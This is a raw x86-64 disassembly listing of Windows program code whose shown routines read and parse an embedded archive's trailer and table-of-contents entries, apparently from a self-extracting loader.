   14000173b:	85 c0                	test   %eax,%eax
   14000173d:	79 10                	jns    0x14000174f
   14000173f:	48 8d 57 12          	lea    0x12(%rdi),%rdx
   140001743:	48 8d 0d 96 c1 02 00 	lea    0x2c196(%rip),%rcx        # 0x14002d8e0
   14000174a:	e8 b1 08 00 00       	call   0x140002000
   14000174f:	8b c3                	mov    %ebx,%eax
   140001751:	48 83 c4 38          	add    $0x38,%rsp
   140001755:	5f                   	pop    %rdi
   140001756:	5b                   	pop    %rbx
   140001757:	c3                   	ret
   140001758:	48 89 6c 24 50       	mov    %rbp,0x50(%rsp)
   14000175d:	48 81 c1 70 30 00 00 	add    $0x3070,%rcx
   140001764:	48 8d 6a 12          	lea    0x12(%rdx),%rbp
   140001768:	4c 89 64 24 60       	mov    %r12,0x60(%rsp)
   14000176d:	48 8b d5             	mov    %rbp,%rdx
   140001770:	e8 6b 58 00 00       	call   0x140006fe0
   140001775:	4c 8b e0             	mov    %rax,%r12
   140001778:	48 85 c0             	test   %rax,%rax
   14000177b:	75 2c                	jne    0x1400017a9
   14000177d:	4c 8b c5             	mov    %rbp,%r8
   140001780:	48 8d 15 81 c1 02 00 	lea    0x2c181(%rip),%rdx        # 0x14002d908
   140001787:	48 8d 0d ae c1 02 00 	lea    0x2c1ae(%rip),%rcx        # 0x14002d93c
   14000178e:	e8 2d 08 00 00       	call   0x140001fc0
   140001793:	48 8b 6c 24 50       	mov    0x50(%rsp),%rbp
   140001798:	41 8d 44 24 ff       	lea    -0x1(%r12),%eax
   14000179d:	4c 8b 64 24 60       	mov    0x60(%rsp),%r12
   1400017a2:	48 83 c4 38          	add    $0x38,%rsp
   1400017a6:	5f                   	pop    %rdi
   1400017a7:	5b                   	pop    %rbx
   1400017a8:	c3                   	ret
   1400017a9:	48 8d 4b 70          	lea    0x70(%rbx),%rcx
   1400017ad:	4c 89 7c 24 20       	mov    %r15,0x20(%rsp)
   1400017b2:	48 8d 15 fb bf 02 00 	lea    0x2bffb(%rip),%rdx        # 0x14002d7b4
   1400017b9:	e8 32 1a 00 00       	call   0x1400031f0
   1400017be:	4c 8b f8             	mov    %rax,%r15
   1400017c1:	48 85 c0             	test   %rax,%rax
   1400017c4:	75 18                	jne    0x1400017de
   1400017c6:	48 8b d5             	mov    %rbp,%rdx
   1400017c9:	48 8d 0d e8 bf 02 00 	lea    0x2bfe8(%rip),%rcx        # 0x14002d7b8
   1400017d0:	e8 2b 08 00 00       	call   0x140002000
   1400017d5:	41 8d 5f ff          	lea    -0x1(%r15),%ebx
   1400017d9:	e9 41 01 00 00       	jmp    0x14000191f
   1400017de:	8b 57 04             	mov    0x4(%rdi),%edx
   1400017e1:	45 33 c0             	xor    %r8d,%r8d
   1400017e4:	48 03 13             	add    (%rbx),%rdx
   1400017e7:	49 8b cf             	mov    %r15,%rcx
   1400017ea:	e8 75 ec 00 00       	call   0x140010464
   1400017ef:	85 c0                	test   %eax,%eax
   1400017f1:	79 20                	jns    0x140001813
   1400017f3:	4c 8b c5             	mov    %rbp,%r8
   1400017f6:	48 8d 15 f3 bf 02 00 	lea    0x2bff3(%rip),%rdx        # 0x14002d7f0
   1400017fd:	48 8d 0d 28 c0 02 00 	lea    0x2c028(%rip),%rcx        # 0x14002d82c
   140001804:	e8 b7 07 00 00       	call   0x140001fc0
   140001809:	bb ff ff ff ff       	mov    $0xffffffff,%ebx
   14000180e:	e9 04 01 00 00       	jmp    0x140001917
   140001813:	80 7f 10 01          	cmpb   $0x1,0x10(%rdi)
   140001817:	75 18                	jne    0x140001831
   140001819:	45 33 c9             	xor    %r9d,%r9d
   14000181c:	4d 8b c4             	mov    %r12,%r8
   14000181f:	48 8b d7             	mov    %rdi,%rdx
   140001822:	49 8b cf             	mov    %r15,%rcx
   140001825:	e8 26 f8 ff ff       	call   0x140001050
   14000182a:	8b d8                	mov    %eax,%ebx
   14000182c:	e9 e6 00 00 00       	jmp    0x140001917
   140001831:	4c 89 6c 24 30       	mov    %r13,0x30(%rsp)
   140001836:	33 db                	xor    %ebx,%ebx
   140001838:	41 bd 00 20 00 00    	mov    $0x2000,%r13d
   14000183e:	4c 89 74 24 28       	mov    %r14,0x28(%rsp)
   140001843:	41 8b cd             	mov    %r13d,%ecx
   140001846:	e8 d1 40 01 00       	call   0x14001591c
   14000184b:	4c 8b f0             	mov    %rax,%r14
   14000184e:	48 85 c0             	test   %rax,%rax
   140001851:	75 1f                	jne    0x140001872
   140001853:	4c 8b c5             	mov    %rbp,%r8
   140001856:	48 8d 15 9b be 02 00 	lea    0x2be9b(%rip),%rdx        # 0x14002d6f8
   14000185d:	48 8d 0d f0 bd 02 00 	lea    0x2bdf0(%rip),%rcx        # 0x14002d654
   140001864:	e8 57 07 00 00       	call   0x140001fc0
   140001869:	41 8d 5e ff          	lea    -0x1(%r14),%ebx
   14000186d:	e9 9b 00 00 00       	jmp    0x14000190d
   140001872:	8b 7f 0c             	mov    0xc(%rdi),%edi
   140001875:	48 85 ff             	test   %rdi,%rdi
   140001878:	0f 84 87 00 00 00    	je     0x140001905
   14000187e:	48 89 74 24 58       	mov    %rsi,0x58(%rsp)
   140001883:	0f 1f 40 00          	nopl   0x0(%rax)
   140001887:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000188e:	00 00 
   140001890:	49 3b fd             	cmp    %r13,%rdi
   140001893:	48 8b f7             	mov    %rdi,%rsi
   140001896:	4d 8b cf             	mov    %r15,%r9
   140001899:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   14000189f:	49 0f 47 f5          	cmova  %r13,%rsi
   1400018a3:	49 8b ce             	mov    %r14,%rcx
   1400018a6:	48 8b d6             	mov    %rsi,%rdx
   1400018a9:	e8 7e e8 00 00       	call   0x14001012c
   1400018ae:	48 83 f8 01          	cmp    $0x1,%rax
   1400018b2:	72 31                	jb     0x1400018e5
   1400018b4:	4d 8b cc             	mov    %r12,%r9
   1400018b7:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   1400018bd:	48 8b d6             	mov    %rsi,%rdx
   1400018c0:	49 8b ce             	mov    %r14,%rcx
   1400018c3:	e8 a4 ef 00 00       	call   0x14001086c
   1400018c8:	48 83 f8 01          	cmp    $0x1,%rax
   1400018cc:	72 07                	jb     0x1400018d5
   1400018ce:	48 2b fe             	sub    %rsi,%rdi
   1400018d1:	75 bd                	jne    0x140001890
   1400018d3:	eb 2b                	jmp    0x140001900
   1400018d5:	48 8d 15 9c be 02 00 	lea    0x2be9c(%rip),%rdx        # 0x14002d778
   1400018dc:	48 8d 0d c9 be 02 00 	lea    0x2bec9(%rip),%rcx        # 0x14002d7ac
   1400018e3:	eb 0e                	jmp    0x1400018f3
   1400018e5:	48 8d 15 4c be 02 00 	lea    0x2be4c(%rip),%rdx        # 0x14002d738
   1400018ec:	48 8d 0d 79 be 02 00 	lea    0x2be79(%rip),%rcx        # 0x14002d76c
   1400018f3:	4c 8b c5             	mov    %rbp,%r8
   1400018f6:	e8 c5 06 00 00       	call   0x140001fc0
   1400018fb:	bb ff ff ff ff       	mov    $0xffffffff,%ebx
   140001900:	48 8b 74 24 58       	mov    0x58(%rsp),%rsi
   140001905:	49 8b ce             	mov    %r14,%rcx
   140001908:	e8 fb 3f 01 00       	call   0x140015908
   14000190d:	4c 8b 6c 24 30       	mov    0x30(%rsp),%r13
   140001912:	4c 8b 74 24 28       	mov    0x28(%rsp),%r14
   140001917:	49 8b cf             	mov    %r15,%rcx
   14000191a:	e8 bd e4 00 00       	call   0x14000fddc
   14000191f:	49 8b cc             	mov    %r12,%rcx
   140001922:	e8 b5 e4 00 00       	call   0x14000fddc
   140001927:	4c 8b 7c 24 20       	mov    0x20(%rsp),%r15
   14000192c:	8b c3                	mov    %ebx,%eax
   14000192e:	48 8b 6c 24 50       	mov    0x50(%rsp),%rbp
   140001933:	4c 8b 64 24 60       	mov    0x60(%rsp),%r12
   140001938:	48 83 c4 38          	add    $0x38,%rsp
   14000193c:	5f                   	pop    %rdi
   14000193d:	5b                   	pop    %rbx
   14000193e:	c3                   	ret
   14000193f:	cc                   	int3
   140001940:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001945:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000194a:	57                   	push   %rdi
   14000194b:	48 83 ec 20          	sub    $0x20,%rsp
   14000194f:	48 8b 59 08          	mov    0x8(%rcx),%rbx
   140001953:	48 8b f2             	mov    %rdx,%rsi
   140001956:	48 8b f9             	mov    %rcx,%rdi
   140001959:	48 3b 59 10          	cmp    0x10(%rcx),%rbx
   14000195d:	73 64                	jae    0x1400019c3
   14000195f:	90                   	nop
   140001960:	44 0f b6 43 11       	movzbl 0x11(%rbx),%r8d
   140001965:	41 8d 40 a6          	lea    -0x5a(%r8),%eax
   140001969:	a8 f7                	test   $0xf7,%al
   14000196b:	74 3a                	je     0x1400019a7
   14000196d:	41 80 f8 64          	cmp    $0x64,%r8b
   140001971:	74 34                	je     0x1400019a7
   140001973:	41 80 f8 6e          	cmp    $0x6e,%r8b
   140001977:	74 2e                	je     0x1400019a7
   140001979:	41 80 f8 78          	cmp    $0x78,%r8b
   14000197d:	74 28                	je     0x1400019a7
   14000197f:	48 8d 43 12          	lea    0x12(%rbx),%rax
   140001983:	4c 8b c6             	mov    %rsi,%r8
   140001986:	4c 2b c0             	sub    %rax,%r8
   140001989:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140001990:	0f b6 10             	movzbl (%rax),%edx
   140001993:	42 0f b6 0c 00       	movzbl (%rax,%r8,1),%ecx
   140001998:	2b d1                	sub    %ecx,%edx
   14000199a:	75 07                	jne    0x1400019a3
   14000199c:	48 ff c0             	inc    %rax
   14000199f:	85 c9                	test   %ecx,%ecx
   1400019a1:	75 ed                	jne    0x140001990
   1400019a3:	85 d2                	test   %edx,%edx
   1400019a5:	eb 0e                	jmp    0x1400019b5
   1400019a7:	48 8d 4b 12          	lea    0x12(%rbx),%rcx
   1400019ab:	48 8b d6             	mov    %rsi,%rdx
   1400019ae:	e8 49 40 01 00       	call   0x1400159fc
   1400019b3:	85 c0                	test   %eax,%eax
   1400019b5:	74 1e                	je     0x1400019d5
   1400019b7:	48 63 03             	movslq (%rbx),%rax
   1400019ba:	48 03 d8             	add    %rax,%rbx
   1400019bd:	48 3b 5f 10          	cmp    0x10(%rdi),%rbx
   1400019c1:	72 9d                	jb     0x140001960
   1400019c3:	33 c0                	xor    %eax,%eax
   1400019c5:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400019ca:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   1400019cf:	48 83 c4 20          	add    $0x20,%rsp
   1400019d3:	5f                   	pop    %rdi
   1400019d4:	c3                   	ret
   1400019d5:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   1400019da:	48 8b c3             	mov    %rbx,%rax
   1400019dd:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400019e2:	48 83 c4 20          	add    $0x20,%rsp
   1400019e6:	5f                   	pop    %rdi
   1400019e7:	c3                   	ret
   1400019e8:	cc                   	int3
   1400019e9:	cc                   	int3
   1400019ea:	cc                   	int3
   1400019eb:	cc                   	int3
   1400019ec:	cc                   	int3
   1400019ed:	cc                   	int3
   1400019ee:	cc                   	int3
   1400019ef:	cc                   	int3
   1400019f0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400019f5:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   1400019fa:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1400019ff:	57                   	push   %rdi
   140001a00:	48 83 ec 20          	sub    $0x20,%rsp
   140001a04:	48 8b 59 08          	mov    0x8(%rcx),%rbx
   140001a08:	48 8b f2             	mov    %rdx,%rsi
   140001a0b:	48 8b e9             	mov    %rcx,%rbp
   140001a0e:	48 c7 c7 ff ff ff ff 	mov    $0xffffffffffffffff,%rdi
   140001a15:	48 ff c7             	inc    %rdi
   140001a18:	80 3c 3a 00          	cmpb   $0x0,(%rdx,%rdi,1)
   140001a1c:	75 f7                	jne    0x140001a15
   140001a1e:	48 3b 59 10          	cmp    0x10(%rcx),%rbx
   140001a22:	73 25                	jae    0x140001a49
   140001a24:	80 7b 11 6f          	cmpb   $0x6f,0x11(%rbx)
   140001a28:	75 13                	jne    0x140001a3d
   140001a2a:	48 8d 4b 12          	lea    0x12(%rbx),%rcx
   140001a2e:	4c 8b c7             	mov    %rdi,%r8
   140001a31:	48 8b d6             	mov    %rsi,%rdx
   140001a34:	e8 a7 40 01 00       	call   0x140015ae0
   140001a39:	85 c0                	test   %eax,%eax
   140001a3b:	74 23                	je     0x140001a60
   140001a3d:	48 63 03             	movslq (%rbx),%rax
   140001a40:	48 03 d8             	add    %rax,%rbx
   140001a43:	48 3b 5d 10          	cmp    0x10(%rbp),%rbx
   140001a47:	72 db                	jb     0x140001a24
   140001a49:	33 c0                	xor    %eax,%eax
   140001a4b:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140001a50:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   140001a55:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140001a5a:	48 83 c4 20          	add    $0x20,%rsp
   140001a5e:	5f                   	pop    %rdi
   140001a5f:	c3                   	ret
   140001a60:	48 8d 43 12          	lea    0x12(%rbx),%rax
   140001a64:	48 03 c7             	add    %rdi,%rax
   140001a67:	48 8d 4b 13          	lea    0x13(%rbx),%rcx
   140001a6b:	48 03 cf             	add    %rdi,%rcx
   140001a6e:	80 38 00             	cmpb   $0x0,(%rax)
   140001a71:	48 0f 45 c1          	cmovne %rcx,%rax
   140001a75:	eb d4                	jmp    0x140001a4b
   140001a77:	cc                   	int3
   140001a78:	cc                   	int3
   140001a79:	cc                   	int3
   140001a7a:	cc                   	int3
   140001a7b:	cc                   	int3
   140001a7c:	cc                   	int3
   140001a7d:	cc                   	int3
   140001a7e:	cc                   	int3
   140001a7f:	cc                   	int3
   140001a80:	48 63 02             	movslq (%rdx),%rax
   140001a83:	48 03 c2             	add    %rdx,%rax
   140001a86:	c3                   	ret
   140001a87:	cc                   	int3
   140001a88:	cc                   	int3
   140001a89:	cc                   	int3
   140001a8a:	cc                   	int3
   140001a8b:	cc                   	int3
   140001a8c:	cc                   	int3
   140001a8d:	cc                   	int3
   140001a8e:	cc                   	int3
   140001a8f:	cc                   	int3
   140001a90:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   140001a95:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140001a9a:	57                   	push   %rdi
   140001a9b:	48 83 ec 30          	sub    $0x30,%rsp
   140001a9f:	48 8b 05 9a e5 03 00 	mov    0x3e59a(%rip),%rax        # 0x140040040
   140001aa6:	48 33 c4             	xor    %rsp,%rax
   140001aa9:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140001aae:	48 8b d9             	mov    %rcx,%rbx
   140001ab1:	48 8d 15 fc bc 02 00 	lea    0x2bcfc(%rip),%rdx        # 0x14002d7b4
   140001ab8:	48 83 c1 70          	add    $0x70,%rcx
   140001abc:	be ff ff ff ff       	mov    $0xffffffff,%esi
   140001ac1:	e8 2a 17 00 00       	call   0x1400031f0
   140001ac6:	48 8b f8             	mov    %rax,%rdi
   140001ac9:	48 85 c0             	test   %rax,%rax
   140001acc:	0f 84 a7 01 00 00    	je     0x140001c79
   140001ad2:	48 8b 05 4f df 02 00 	mov    0x2df4f(%rip),%rax        # 0x14002fa28
   140001ad9:	44 8d 46 09          	lea    0x9(%rsi),%r8d
   140001add:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140001ae2:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140001ae7:	48 c1 e8 18          	shr    $0x18,%rax
   140001aeb:	48 8b cf             	mov    %rdi,%rcx
   140001aee:	04 0c                	add    $0xc,%al
   140001af0:	48 89 6c 24 48       	mov    %rbp,0x48(%rsp)
   140001af5:	88 44 24 23          	mov    %al,0x23(%rsp)
   140001af9:	e8 82 5b 00 00       	call   0x140007680
   140001afe:	48 8b e8             	mov    %rax,%rbp
   140001b01:	48 85 c0             	test   %rax,%rax
   140001b04:	0f 84 62 01 00 00    	je     0x140001c6c
   140001b0a:	45 33 c0             	xor    %r8d,%r8d
   140001b0d:	48 8b d0             	mov    %rax,%rdx
   140001b10:	48 8b cf             	mov    %rdi,%rcx
   140001b13:	e8 4c e9 00 00       	call   0x140010464
   140001b18:	85 c0                	test   %eax,%eax
   140001b1a:	79 18                	jns    0x140001b34
   140001b1c:	48 8d 15 25 be 02 00 	lea    0x2be25(%rip),%rdx        # 0x14002d948
   140001b23:	48 8d 0d 02 bd 02 00 	lea    0x2bd02(%rip),%rcx        # 0x14002d82c
   140001b2a:	e8 91 04 00 00       	call   0x140001fc0
   140001b2f:	e9 38 01 00 00       	jmp    0x140001c6c
   140001b34:	ba 58 00 00 00       	mov    $0x58,%edx
   140001b39:	48 8d 4b 18          	lea    0x18(%rbx),%rcx
   140001b3d:	4c 8b cf             	mov    %rdi,%r9
   140001b40:	44 8d 42 a9          	lea    -0x57(%rdx),%r8d
   140001b44:	e8 e3 e5 00 00       	call   0x14001012c
   140001b49:	48 83 f8 01          	cmp    $0x1,%rax
   140001b4d:	73 18                	jae    0x140001b67
   140001b4f:	48 8d 15 1a be 02 00 	lea    0x2be1a(%rip),%rdx        # 0x14002d970
   140001b56:	48 8d 0d 0f bc 02 00 	lea    0x2bc0f(%rip),%rcx        # 0x14002d76c
   140001b5d:	e8 5e 04 00 00       	call   0x140001fc0
   140001b62:	e9 05 01 00 00       	jmp    0x140001c6c
   140001b67:	8b 4b 20             	mov    0x20(%rbx),%ecx
   140001b6a:	45 33 c0             	xor    %r8d,%r8d
   140001b6d:	8b 43 24             	mov    0x24(%rbx),%eax
   140001b70:	0f c8                	bswap  %eax
   140001b72:	89 43 24             	mov    %eax,0x24(%rbx)
   140001b75:	8b 43 28             	mov    0x28(%rbx),%eax
   140001b78:	0f c8                	bswap  %eax
   140001b7a:	89 43 28             	mov    %eax,0x28(%rbx)
   140001b7d:	8b 43 2c             	mov    0x2c(%rbx),%eax
   140001b80:	0f c9                	bswap  %ecx
   140001b82:	8b c9                	mov    %ecx,%ecx
   140001b84:	48 2b e9             	sub    %rcx,%rbp
   140001b87:	89 4b 20             	mov    %ecx,0x20(%rbx)
   140001b8a:	0f c8                	bswap  %eax
   140001b8c:	89 43 2c             	mov    %eax,0x2c(%rbx)
   140001b8f:	48 83 c5 58          	add    $0x58,%rbp
   140001b93:	48 89 2b             	mov    %rbp,(%rbx)
   140001b96:	48 8b cf             	mov    %rdi,%rcx
   140001b99:	c7 83 78 50 00 00 00 	movl   $0x0,0x5078(%rbx)
   140001ba0:	00 00 00 
   140001ba3:	89 05 5b f1 03 00    	mov    %eax,0x3f15b(%rip)        # 0x140040d04
   140001ba9:	8b 53 24             	mov    0x24(%rbx),%edx
   140001bac:	48 03 13             	add    (%rbx),%rdx
   140001baf:	e8 b0 e8 00 00       	call   0x140010464
   140001bb4:	48 63 4b 28          	movslq 0x28(%rbx),%rcx
   140001bb8:	e8 5f 3d 01 00       	call   0x14001591c
   140001bbd:	48 89 43 08          	mov    %rax,0x8(%rbx)
   140001bc1:	48 85 c0             	test   %rax,%rax
   140001bc4:	75 18                	jne    0x140001bde
   140001bc6:	48 8d 15 bb bd 02 00 	lea    0x2bdbb(%rip),%rdx        # 0x14002d988
   140001bcd:	48 8d 0d 80 ba 02 00 	lea    0x2ba80(%rip),%rcx        # 0x14002d654
   140001bd4:	e8 e7 03 00 00       	call   0x140001fc0
   140001bd9:	e9 8e 00 00 00       	jmp    0x140001c6c
   140001bde:	48 63 53 28          	movslq 0x28(%rbx),%rdx
   140001be2:	4c 8b cf             	mov    %rdi,%r9
   140001be5:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140001beb:	48 8b c8             	mov    %rax,%rcx
   140001bee:	e8 39 e5 00 00       	call   0x14001012c
   140001bf3:	48 83 f8 01          	cmp    $0x1,%rax
   140001bf7:	73 15                	jae    0x140001c0e
   140001bf9:	48 8d 15 b0 bd 02 00 	lea    0x2bdb0(%rip),%rdx        # 0x14002d9b0
   140001c00:	48 8d 0d 65 bb 02 00 	lea    0x2bb65(%rip),%rcx        # 0x14002d76c
   140001c07:	e8 b4 03 00 00       	call   0x140001fc0
   140001c0c:	eb 5e                	jmp    0x140001c6c
   140001c0e:	48 63 43 28          	movslq 0x28(%rbx),%rax
   140001c12:	48 8b cf             	mov    %rdi,%rcx
   140001c15:	48 03 43 08          	add    0x8(%rbx),%rax
   140001c19:	48 89 43 10          	mov    %rax,0x10(%rbx)
   140001c1d:	e8 7e e2 00 00       	call   0x14000fea0
   140001c22:	85 c0                	test   %eax,%eax
   140001c24:	74 0e                	je     0x140001c34
   140001c26:	48 8d 0d a3 bd 02 00 	lea    0x2bda3(%rip),%rcx        # 0x14002d9d0
   140001c2d:	e8 ce 03 00 00       	call   0x140002000
   140001c32:	eb 38                	jmp    0x140001c6c
   140001c34:	48 8b 43 08          	mov    0x8(%rbx),%rax
   140001c38:	48 3b 43 10          	cmp    0x10(%rbx),%rax
   140001c3c:	73 2c                	jae    0x140001c6a
   140001c3e:	66 90                	xchg   %ax,%ax
   140001c40:	8b 48 04             	mov    0x4(%rax),%ecx
   140001c43:	8b 10                	mov    (%rax),%edx
   140001c45:	0f c9                	bswap  %ecx
   140001c47:	89 48 04             	mov    %ecx,0x4(%rax)
   140001c4a:	8b 48 08             	mov    0x8(%rax),%ecx
   140001c4d:	0f c9                	bswap  %ecx
   140001c4f:	89 48 08             	mov    %ecx,0x8(%rax)
   140001c52:	8b 48 0c             	mov    0xc(%rax),%ecx
   140001c55:	0f c9                	bswap  %ecx
   140001c57:	89 48 0c             	mov    %ecx,0xc(%rax)
   140001c5a:	0f ca                	bswap  %edx
   140001c5c:	89 10                	mov    %edx,(%rax)
   140001c5e:	48 63 ca             	movslq %edx,%rcx
   140001c61:	48 03 c1             	add    %rcx,%rax
   140001c64:	48 3b 43 10          	cmp    0x10(%rbx),%rax
   140001c68:	72 d6                	jb     0x140001c40
   140001c6a:	33 f6                	xor    %esi,%esi
   140001c6c:	48 8b cf             	mov    %rdi,%rcx
   140001c6f:	e8 68 e1 00 00       	call   0x14000fddc
   140001c74:	48 8b 6c 24 48       	mov    0x48(%rsp),%rbp
   140001c79:	8b c6                	mov    %esi,%eax
   140001c7b:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   140001c80:	48 33 cc             	xor    %rsp,%rcx
   140001c83:	e8 18 98 00 00       	call   0x14000b4a0
   140001c88:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   140001c8d:	48 8b 74 24 58       	mov    0x58(%rsp),%rsi
   140001c92:	48 83 c4 30          	add    $0x30,%rsp
   140001c96:	5f                   	pop    %rdi
   140001c97:	c3                   	ret
   140001c98:	cc                   	int3
   140001c99:	cc                   	int3
   140001c9a:	cc                   	int3
   140001c9b:	cc                   	int3
   140001c9c:	cc                   	int3
   140001c9d:	cc                   	int3
   140001c9e:	cc                   	int3
   140001c9f:	cc                   	int3
   140001ca0:	40 53                	rex push %rbx
   140001ca2:	55                   	push   %rbp
   140001ca3:	57                   	push   %rdi
   140001ca4:	b8 30 20 00 00       	mov    $0x2030,%eax
   140001ca9:	e8 92 97 00 00       	call   0x14000b440
   140001cae:	48 2b e0             	sub    %rax,%rsp
   140001cb1:	48 8b 05 88 e3 03 00 	mov    0x3e388(%rip),%rax        # 0x140040040
   140001cb8:	48 33 c4             	xor    %rsp,%rax
   140001cbb:	48 89 84 24 20 20 00 	mov    %rax,0x2020(%rsp)
   140001cc2:	00 
   140001cc3:	49 8b d8             	mov    %r8,%rbx
   140001cc6:	48 8b ea             	mov    %rdx,%rbp
   140001cc9:	48 8b f9             	mov    %rcx,%rdi
   140001ccc:	4c 8d 05 0d bd 02 00 	lea    0x2bd0d(%rip),%r8        # 0x14002d9e0
   140001cd3:	4c 8b ca             	mov    %rdx,%r9
   140001cd6:	48 83 c1 70          	add    $0x70,%rcx
   140001cda:	ba 00 10 00 00       	mov    $0x1000,%edx
   140001cdf:	e8 fc 01 00 00       	call   0x140001ee0
   140001ce4:	3d 00 10 00 00       	cmp    $0x1000,%eax
   140001ce9:	0f 8d 5b 01 00 00    	jge    0x140001e4a
   140001cef:	48 8d 8f 70 10 00 00 	lea    0x1070(%rdi),%rcx
   140001cf6:	4c 8b cb             	mov    %rbx,%r9
   140001cf9:	4c 8d 05 e0 bc 02 00 	lea    0x2bce0(%rip),%r8        # 0x14002d9e0
   140001d00:	ba 00 10 00 00       	mov    $0x1000,%edx
   140001d05:	e8 d6 01 00 00       	call   0x140001ee0
   140001d0a:	3d 00 10 00 00       	cmp    $0x1000,%eax
   140001d0f:	0f 8d 35 01 00 00    	jge    0x140001e4a
   140001d15:	48 8b cf             	mov    %rdi,%rcx
   140001d18:	e8 73 fd ff ff       	call   0x140001a90
   140001d1d:	85 c0                	test   %eax,%eax
   140001d1f:	0f 85 25 01 00 00    	jne    0x140001e4a
   140001d25:	48 8b 4f 08          	mov    0x8(%rdi),%rcx
   140001d29:	48 8b 57 10          	mov    0x10(%rdi),%rdx
   140001d2d:	89 87 70 50 00 00    	mov    %eax,0x5070(%rdi)
   140001d33:	48 3b ca             	cmp    %rdx,%rcx
   140001d36:	73 2f                	jae    0x140001d67
   140001d38:	41 b8 01 05 10 40    	mov    $0x40100501,%r8d
   140001d3e:	66 90                	xchg   %ax,%ax
   140001d40:	0f b6 41 11          	movzbl 0x11(%rcx),%eax
   140001d44:	2c 5a                	sub    $0x5a,%al
   140001d46:	3c 1e                	cmp    $0x1e,%al
   140001d48:	77 06                	ja     0x140001d50
   140001d4a:	41 0f a3 c0          	bt     %eax,%r8d
   140001d4e:	72 0d                	jb     0x140001d5d
   140001d50:	48 63 01             	movslq (%rcx),%rax
   140001d53:	48 03 c8             	add    %rax,%rcx
   140001d56:	48 3b ca             	cmp    %rdx,%rcx
   140001d59:	72 e5                	jb     0x140001d40
   140001d5b:	eb 0a                	jmp    0x140001d67
   140001d5d:	c7 87 70 50 00 00 01 	movl   $0x1,0x5070(%rdi)
   140001d64:	00 00 00 
   140001d67:	48 8b d3             	mov    %rbx,%rdx
   140001d6a:	48 89 b4 24 68 20 00 	mov    %rsi,0x2068(%rsp)
   140001d71:	00 
   140001d72:	48 8d 8c 24 20 10 00 	lea    0x1020(%rsp),%rcx
   140001d79:	00 
   140001d7a:	e8 91 12 00 00       	call   0x140003010
   140001d7f:	48 8b 5f 08          	mov    0x8(%rdi),%rbx
   140001d83:	48 3b 5f 10          	cmp    0x10(%rdi),%rbx
   140001d87:	73 33                	jae    0x140001dbc
   140001d89:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140001d90:	80 7b 11 6f          	cmpb   $0x6f,0x11(%rbx)
   140001d94:	75 1a                	jne    0x140001db0
   140001d96:	48 8d 4b 12          	lea    0x12(%rbx),%rcx
   140001d9a:	41 b8 16 00 00 00    	mov    $0x16,%r8d
   140001da0:	48 8d 15 41 bc 02 00 	lea    0x2bc41(%rip),%rdx        # 0x14002d9e8
   140001da7:	e8 34 3d 01 00       	call   0x140015ae0
   140001dac:	85 c0                	test   %eax,%eax
   140001dae:	74 58                	je     0x140001e08
   140001db0:	48 63 03             	movslq (%rbx),%rax
   140001db3:	48 03 d8             	add    %rax,%rbx
   140001db6:	48 3b 5f 10          	cmp    0x10(%rdi),%rbx
   140001dba:	72 d4                	jb     0x140001d90
   140001dbc:	48 8d 9f 70 20 00 00 	lea    0x2070(%rdi),%rbx
   140001dc3:	48 8b d5             	mov    %rbp,%rdx
   140001dc6:	48 8b cb             	mov    %rbx,%rcx
   140001dc9:	e8 42 12 00 00       	call   0x140003010
   140001dce:	48 8b b4 24 68 20 00 	mov    0x2068(%rsp),%rsi
   140001dd5:	00 
   140001dd6:	48 8d 97 70 40 00 00 	lea    0x4070(%rdi),%rdx
   140001ddd:	c7 87 74 50 00 00 00 	movl   $0x0,0x5074(%rdi)
   140001de4:	00 00 00 
   140001de7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   140001dee:	00 00 
   140001df0:	0f b6 0b             	movzbl (%rbx),%ecx
   140001df3:	48 8d 5b 01          	lea    0x1(%rbx),%rbx
   140001df7:	88 0a                	mov    %cl,(%rdx)
   140001df9:	48 8d 52 01          	lea    0x1(%rdx),%rdx
   140001dfd:	84 c9                	test   %cl,%cl
   140001dff:	75 ef                	jne    0x140001df0
   140001e01:	b8 01 00 00 00       	mov    $0x1,%eax
   140001e06:	eb 44                	jmp    0x140001e4c
   140001e08:	80 7b 28 00          	cmpb   $0x0,0x28(%rbx)
   140001e0c:	48 8d 73 28          	lea    0x28(%rbx),%rsi
   140001e10:	74 04                	je     0x140001e16
   140001e12:	48 8d 73 29          	lea    0x29(%rbx),%rsi
   140001e16:	48 85 f6             	test   %rsi,%rsi
   140001e19:	74 a1                	je     0x140001dbc
   140001e1b:	83 bf 70 50 00 00 00 	cmpl   $0x0,0x5070(%rdi)
   140001e22:	75 98                	jne    0x140001dbc
   140001e24:	48 8b d5             	mov    %rbp,%rdx
   140001e27:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140001e2c:	e8 df 11 00 00       	call   0x140003010
   140001e31:	48 8d 9f 70 20 00 00 	lea    0x2070(%rdi),%rbx
   140001e38:	4c 8b c6             	mov    %rsi,%r8
   140001e3b:	48 8b cb             	mov    %rbx,%rcx
   140001e3e:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140001e43:	e8 88 14 00 00       	call   0x1400032d0
   140001e48:	eb 84                	jmp    0x140001dce
